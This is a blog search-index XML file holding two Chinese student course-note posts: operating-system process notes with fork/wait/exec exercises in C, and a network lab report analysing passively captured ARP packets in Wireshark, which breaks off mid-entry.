<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Operating Systems</title>
    <link href="/2023/03/23/Operating-Systems/"/>
    <url>/2023/03/23/Operating-Systems/</url>
    
    <content type="html"><![CDATA[<h1 id="Operating-System"><a href="#Operating-System" class="headerlink" title="Operating System"></a>Operating System</h1><h1 id="第一章-关于本书的对话"><a href="#第一章-关于本书的对话" class="headerlink" title="第一章 关于本书的对话"></a>第一章 关于本书的对话</h1><p>关于 <strong>Three Easy Pieces</strong> 指的是 **虚拟化(virtualization), 并发(concurrency), 持久性(persistence)**这是我们要学习的三个重要概念。</p><h1 id="第二章-操作系统介绍"><a href="#第二章-操作系统介绍" class="headerlink" title="第二章 操作系统介绍"></a>第二章 操作系统介绍</h1><p>有一类软件负责让程序运行变得更加容易，允许你同时运行多个程序，允许程序共享内存，让程序能与设备进行交互，以及其他类似有趣的工作。这些软件称为 <strong>操作系统(Operating System，OS)</strong> 。</p><h1 id="第三章-关于虚拟化的对话"><a href="#第三章-关于虚拟化的对话" class="headerlink" title="第三章 关于虚拟化的对话"></a>第三章 关于虚拟化的对话</h1><p>虚拟化：给一群人一共一个桃子，但让每个人认为，他独占这个桃子。</p><h1 id="第四章-抽象：进程"><a href="#第四章-抽象：进程" class="headerlink" title="第四章 抽象：进程"></a>第四章 抽象：进程</h1><p>进程：运行中的程序。<br>时分共享CPU（time sharing）：让一个进程只允许一个时间片，然后切换到其他进程。</p><h2 id="进程-API"><a href="#进程-API" class="headerlink" title="进程 API"></a>进程 API</h2><p>所有现代操作系统都以某种形式提供这些 API</p><ul><li><strong>创建（create）</strong>：操作系统包含一些创建新进程的方法。</li><li><strong>销毁（destroy）</strong>：销毁进程的接口。</li><li><strong>等待（wait）</strong>：等待进程停止运行。</li><li><strong>其他控制（miscellaneous control）</strong>：例如暂停、恢复等操作。</li><li><strong>状态（statu）</strong>：获取进制的状态信息。</li></ul><h2 id="进程创建"><a href="#进程创建" class="headerlink" title="进程创建"></a>进程创建</h2><p>首先，将程序（代码、静态数据）加载（load）到内存中，加载到进程的地址空间中。<br><img src="/2023/03/23/Operating-Systems/p1.png"></p><p>现代操作系统是懒加载（lazily load），即尽在程序执行期间需要的代码或数据片段，才会加载。</p><p>加载了代码与静态数据到内存后，操作系统需要为程序的运行时栈分配一些内存。<br>再为堆也分配一些内存。并执行一些与I/O相关的工作。</p><p>当OS终于为程序执行搭好了舞台，他还有最后一项任务：启动程序。在入口处运行，即 main()。通过跳转到 main()例程，OS 将 CPU 的控制权转移到新创建的进程中。</p><h2 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h2><p>进程可以处于以下三种状态之一：</p><ul><li><strong>运行（running）</strong>：运行状态下，进程在处理器上运行。</li><li><strong>就绪（ready）</strong>：程序以及准备好运行。</li><li><strong>阻塞（blocked）</strong>：阻塞状态下，一个进程执行了某种操作，直到其他事件发生才会准备运行。例如一个进程向磁盘发起 I/O 请求，它会被阻塞，其他进程可以使用处理器。</li></ul><p><img src="/2023/03/23/Operating-Systems/p2.png"></p><h1 id="第五章-插叙：进程-API"><a href="#第五章-插叙：进程-API" class="headerlink" title="第五章 插叙：进程 API"></a>第五章 插叙：进程 API</h1><h2 id="fork-系统调用"><a href="#fork-系统调用" class="headerlink" title="fork()系统调用"></a>fork()系统调用</h2><p>系统调用 fork()用于创建新进程。</p><figure class="highlight c"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br>    <span class="hljs-type">int</span>  <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br> &#123;<br>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world (pid:%d)\n&quot;</span>, (<span class="hljs-type">int</span>) getpid());<br>     <span class="hljs-type">int</span> rc = fork();<br>     <span class="hljs-keyword">if</span> (rc &lt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// fork failed; exit</span><br>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fork failed\n&quot;</span>);<br>     <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br> &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rc == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// child (new process)</span><br>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello, I am child (pid:%d)\n&quot;</span>, (<span class="hljs-type">int</span>) getpid());<br> &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// parent goes down this path (main)</span><br>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello, I am parent of %d (pid:%d)\n&quot;</span>,<br>     rc, (<span class="hljs-type">int</span>) getpid()); <br> &#125;<br>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> &#125; <br></code></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">prompt</span>&gt; ./<span class="hljs-selector-tag">p1</span><br><span class="hljs-selector-tag">hello</span> <span class="hljs-selector-tag">world</span> (<span class="hljs-attribute">pid</span>:<span class="hljs-number">29146</span>)<br><span class="hljs-selector-tag">hello</span>, <span class="hljs-selector-tag">I</span> <span class="hljs-selector-tag">am</span> <span class="hljs-selector-tag">parent</span> <span class="hljs-selector-tag">of</span> <span class="hljs-number">29147</span> (<span class="hljs-attribute">pid</span>:<span class="hljs-number">29146</span>)<br><span class="hljs-selector-tag">hello</span>, <span class="hljs-selector-tag">I</span> <span class="hljs-selector-tag">am</span> <span class="hljs-selector-tag">child</span> (<span class="hljs-attribute">pid</span>:<span class="hljs-number">29147</span>)<br><span class="hljs-selector-tag">prompt</span>&gt; <br></code></pre></td></tr></table></figure><p>fork()出的子进程不会从 main()函数开始执行（因此hello world 信息只输出了一次），而是直接从 fork()系统调用返回。就好像它自己调用了 fork()。<br>子进程并不是完全拷贝了父进程。具体来说，虽然它拥有自己的地址空间、寄存器、程序计数器等，但它从 fork() 返回的值是不同的。父进程获得的 fork() 返回值是子进程的 pid ， 而子进程获得的返回值是 0 。这个差别很重要。<br>且父、子进程输出是不确定的，即有可能父进程先运行，也有可能子进程先运行。<br>CPU 调度程序（scheduler） 决定了某个时刻哪个进程被执行。</p><h2 id="wait-系统调用"><a href="#wait-系统调用" class="headerlink" title="wait() 系统调用"></a>wait() 系统调用</h2><p>当父进程调用 wait() 于某处时，若父进程碰巧被先执行，也会延迟执行，等到子进程执行完毕，wait() 才返回父进程。</p><h2 id="exec-系统调用"><a href="#exec-系统调用" class="headerlink" title="exec() 系统调用"></a>exec() 系统调用</h2><p>exec() 给定可执行程序的名称及需要的参数后，exec() 会从可执行程序中加载代码和静态数据，并用它覆写自己的代码段，堆、栈及其他内存空间也会被重新初始化。子进程执行exec()之后，几乎就像 p3.c 未曾运行过一样，即对 exec() 的成功调用<strong>永远不会返回</strong></p><p>如下例中，子进程调用 exec() 后，exec调用的程序执行完以后，子进程内未进行的代码段不会进行，而是直接去进行排队等待的父进程去了。</p><p><img src="/2023/03/23/Operating-Systems/p3.png"></p><p>关于管道：pipe() 系统调用。这种情况下，一个进程的输出被链接到了一个内核管道(pipe)上(队列), 另一个进程的输入也被链接到同一个管道上。因此，前一个进程的输出可以无缝地作为后一个进程的输入，许多命令可以用这种方式串联起来，完成某项任务。（23.03.23更）</p><h2 id="第五章课后习题"><a href="#第五章课后习题" class="headerlink" title="第五章课后习题"></a>第五章课后习题</h2><p>1.编写一个调用 fork()的程序。在调用 fork()之前，让主进程访问一个变量（例如 x） 并将其值设置为某个值（例如 100）。子进程中的变量有什么值？当子进程和父进程都改变 x 的值时，变量会发生什么？</p><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world ( pid : %d )\n&quot;</span>,(<span class="hljs-type">int</span>) getpid());<br>        <span class="hljs-type">int</span> x = <span class="hljs-number">100</span>;<br>        <span class="hljs-type">int</span> rc = fork();<br>        <span class="hljs-keyword">if</span>(rc &lt; <span class="hljs-number">0</span> )<br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fork failed\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(rc ==<span class="hljs-number">0</span> )<br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello, I am Child (pid : %d)\n&quot;</span>,(<span class="hljs-type">int</span>) getpid());<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The value x = %d \n&quot;</span>,x);<br>                x += <span class="hljs-number">1</span>;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The value x has been changed to = %d \n&quot;</span>,x);<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The value x = %d \n&quot;</span>,x);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello, I am Parent of %d (pid : %d)\n&quot;</span>,rc,(<span class="hljs-type">int</span>) getpid());<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The value x = %d \n&quot;</span>,x);<br>                x += <span class="hljs-number">10</span>;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The value x has been changed to = %d \n&quot;</span>,x);<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The value x = %d \n&quot;</span>,x);<br>        &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">kawa@kawa-virtual-machine:~/Desktop$ ./h1<br>hello world ( pid : 3990 )<br>hello, I am Parent of 3991 (pid : 3990)<br>The value x = 100 <br>The value x has been changed to = 110 <br>The value x = 110 <br>hello, I am Child (pid : 3991)<br>The value x = 100 <br>The value x has been changed to = 101 <br>The value x = 101 <br><br></code></pre></td></tr></table></figure><p>可见，父、子进程中，x 初始值均为 100，因为 fork() 时，是复制的当时的程序数据，给到子进程，所以 x 初值均为 100 。</p><p>3.使用 fork()编写另一个程序。子进程应打印“hello”，父进程应打印“goodbye”。你应该尝试确保子进程始终先打印。你能否不在父进程调用 wait()而做到这一点呢？</p><p>使用vfork() 实现这一点：</p><p>代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world ( pid : %d )\n&quot;</span>,(<span class="hljs-type">int</span>) getpid());<br>        <span class="hljs-type">int</span> rc = vfork();<br>        <span class="hljs-keyword">if</span>(rc &lt; <span class="hljs-number">0</span> )<br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fork failed\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(rc ==<span class="hljs-number">0</span> )<br>        &#123;<br><br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello\n&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;goodbye!\n&quot;</span>);<br>        &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果如下：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript">kawa<span class="hljs-meta">@kawa</span>-virtual-<span class="hljs-attr">machine</span>:~<span class="hljs-regexp">/Desktop$ ./</span>h3<br>hello world ( pid : <span class="hljs-number">5321</span> )<br>hello<br>goodbye!<br></code></pre></td></tr></table></figure><p>可见，vfork() 成功完成了其使命。</p><p>5.现在编写一个程序，在父进程中使用 wait()，等待子进程完成。wait()返回什么？如果你在子进程中使用 wait()会发生什么？</p><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world ( pid : %d )\n&quot;</span>,(<span class="hljs-type">int</span>) getpid());<br>        <span class="hljs-type">int</span> rc = fork();<br>        <span class="hljs-keyword">if</span>(rc &lt; <span class="hljs-number">0</span> )<br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fork failed\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(rc ==<span class="hljs-number">0</span> )<br>        &#123;<br><br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is Child pid = %d \n&quot;</span>,(<span class="hljs-type">int</span>) getpid());<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is parent pid = %d \n&quot;</span> ,(<span class="hljs-type">int</span>) getpid());<br>                <span class="hljs-type">int</span> w = wait();<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the return value of wait() is : %d \n&quot;</span>,w);<br>        &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs csharp">kawa@kawa-<span class="hljs-keyword">virtual</span>-machine:~/Desktop$ ./<span class="hljs-function">h5</span><br><span class="hljs-function">hello <span class="hljs-title">world</span> (<span class="hljs-params"> pid : <span class="hljs-number">5479</span> </span>)</span><br><span class="hljs-function">This <span class="hljs-keyword">is</span> parent pid</span> = <span class="hljs-number">5479</span> <br>This <span class="hljs-keyword">is</span> Child pid = <span class="hljs-number">5480</span> <br><span class="hljs-function">the <span class="hljs-keyword">return</span> <span class="hljs-keyword">value</span> of <span class="hljs-title">wait</span>() <span class="hljs-keyword">is</span> : 5480</span><br></code></pre></td></tr></table></figure><p>显然，wait() 返回值为 子进程的pid。</p><p>当子进程wait时：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world ( pid : %d )\n&quot;</span>,(<span class="hljs-type">int</span>) getpid());<br>        <span class="hljs-type">int</span> rc = fork();<br>        <span class="hljs-keyword">if</span>(rc &lt; <span class="hljs-number">0</span> )<br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fork failed\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(rc ==<span class="hljs-number">0</span> )<br>        &#123;<br><br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is Child pid = %d \n&quot;</span>,(<span class="hljs-type">int</span>) getpid());<br>                <span class="hljs-type">int</span> w = wait();<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the return value of wait() is : %d \n&quot;</span>,w);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is parent pid = %d \n&quot;</span> ,(<span class="hljs-type">int</span>) getpid());<br>        &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp">kawa@kawa-<span class="hljs-keyword">virtual</span>-machine:~/Desktop$ ./<span class="hljs-function">h5</span><br><span class="hljs-function">hello <span class="hljs-title">world</span> (<span class="hljs-params"> pid : <span class="hljs-number">5569</span> </span>)</span><br><span class="hljs-function">This <span class="hljs-keyword">is</span> parent pid</span> = <span class="hljs-number">5569</span> <br>This <span class="hljs-keyword">is</span> Child pid = <span class="hljs-number">5570</span> <br><span class="hljs-function">the <span class="hljs-keyword">return</span> <span class="hljs-keyword">value</span> of <span class="hljs-title">wait</span>() <span class="hljs-keyword">is</span> : -1 </span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure><p>可见，子进程中调用 wait，返回值为 -1。</p><p>因为wait() 返回值为成功结束的子进程，而子进程中无法收集到更下一级的子进程pid（因为不存在），就会导致回收失败，返回值为-1。</p><p>7.编写一个创建子进程的程序，然后在子进程中关闭标准输出（STDOUT_FILENO）。 如果子进程在关闭描述符后调用 printf()打印输出，会发生什么？</p><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> rc = fork();<br><span class="hljs-keyword">if</span> (rc &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fork failed&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rc == <span class="hljs-number">0</span>) &#123;<br>close(STDOUT_FILENO);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;output child\n&quot;</span>);<br>&#125;<br>wait(<span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出：</p><p>无。</p><p>没有输出。</p><p>习题到此为止。</p>]]></content>
    
    
    
    <tags>
      
      <tag>course</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络实验一</title>
    <link href="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/"/>
    <url>/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="计网实验一Wireshark抓包、改包等"><a href="#计网实验一Wireshark抓包、改包等" class="headerlink" title="计网实验一Wireshark抓包、改包等"></a>计网实验一Wireshark抓包、改包等</h1><h2 id="实验内容一："><a href="#实验内容一：" class="headerlink" title="实验内容一："></a>实验内容一：</h2><h3 id="实验要求："><a href="#实验要求：" class="headerlink" title="实验要求："></a>实验要求：</h3><p>使用wireshark在教学楼，咖啡店（或其他提供顾客Wi-Fi的营业性公共场所），寝室三类地点静默观察能听到的数据包，观察wireshark对它的分层解析，尽可能多的描述你看到了什么，以及这三类地方数据包的不同。如果只给你一段wireshark的数据包记录，例如pcap文件，你能区分它是从哪里采集的吗？可行性如何，难点主要在哪里。</p><h3 id="实验内容："><a href="#实验内容：" class="headerlink" title="实验内容："></a>实验内容：</h3><p>1.在教学楼、咖啡店、寝室静默观察数据包</p><p>1.1 教学楼观察到的数据包</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p1.png"></p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p2.png"></p><p>可以看到，绝大多数为 ARP 协议的数据包，其余少量的数据包分别是 NBNS , MDNS , DHCP 等数据包。<br>ARP数据包：ARP（Address Resolution Protocol）地址解析协议，根据IP地址获取物理地址的一个TCP/IP协议。</p><p>由于OSI模型把网络分为七层，IP地址在OSI模型第三层，MAC地址在第二层，彼此不直接通信。在通过以太网发送IP数据包时，需要封装第三层（32位IP地址）和第二层（48位MAC地址）的报头，由于发送数据包时，只知道目标IP地址，不知道其MAC地址，而又不能跨越第二、三层，所有需要使用地址解析协议。</p><p>ARP 的报文格式：</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p3.png"></p><ul><li><p>字段1：ARP请求的目的以太网地址，全1时，代表广播地址。</p></li><li><p>字段2：发送ARP请求的以太网地址。</p></li><li><p>字段3：以太网帧类型表示后面的数据类型，ARP请求和ARP应答此字段为：0x0806。</p></li><li><p>字段4：硬件地址类型，硬件地址不止以太网一种，是以太网类型时，值为1。</p></li><li><p>字段5：表示要映射的协议地址的类型，要对IPv4地址进行映射，此值为0x0800。</p></li><li><p>字段6和7：表示硬件地址长度和协议地址长度，MAC地址占6字节，IP地址占4字节。</p></li><li><p>字段8：是操作类型字段，值为1，表示进行ARP请求；值为2，表示进行ARP应答；值为3，表示进行RARP请求；值为4，表示进行RARP应答。</p></li><li><p>字段9：是发送端ARP请求或应答的硬件地址，这里是以太网地址，和字段2相同。</p></li><li><p>字段10：是发送ARP请求或应答的IP地址。</p></li><li><p>字段11和12：是目的端的硬件地址和IP地址。</p></li></ul><p>对抓到的 ARP 数据包进行分析：</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p4.png"><br>Frame 9: 56 bytes on wire </p><p>指的是这是第9帧数据包的详细信息，这个包大小为56字节。</p><p>Ethernet II , Src : Tp-LinkT_a1:f4:64 , Dst : Broadcast</p><p>以上内容表示以太网帧头部信息，源地址是Src后的内容，目的地址是全1，即为广播，因为主机PC2不知道PC1主机的MAC地址，这样，局域网内所有设备都会收到该数据包。</p><p>Address Resolution Protocol(request)</p><p>以上内容表示地址解析协议的内容，request 表示该包是一个请求包。在该包中，包含有ARP更详细的字段信息，如下所示：</p><ul><li><p>Address Resolution Protocol (request)   #ARP请求包 </p></li><li><p>Hardware type: Ethernet (1)   #硬件类型 </p></li><li><p>Protocol type: IP (0x0800)   #协议类型 </p></li><li><p>Hardware size: 6   #硬件地址 </p></li><li><p>Protocol size: 4  #协议长度 </p></li><li><p>Opcode: request (1)   #操作码。该值为1表示是个ARP请求包 </p></li><li><p>Sender MAC address: 02:00:04:78:01:7b (02:00:04:78:01:7b)   #发送端MAC地址 </p></li><li><p>Sender IP address: 10.1.1.142 (10.1.1.142)   #发送端IP地址 </p></li><li><p>Target MAC address: 00:00:00_00:00:00 (00:00:00:00:00:00)   #目标MAC地址 </p></li><li><p>Target IP address: 10.1.1.166(10.1.1.166)   #目标IP地址 </p></li></ul><p>纵观所有抓到的包，其最大不同在于source的不同，有的是HuaweiTe_09:e8:48，有的是Tp-LinkT_13:68:28等等，这些不同的源应该是不同的同学的host。由于广播的原因，我可以捕获这些包。</p><p>1.2寝室观察到的数据包</p><p>由于教室、寝室，均连接校园网，预测结果基本一致</p><p>抓包结果：</p><p><img 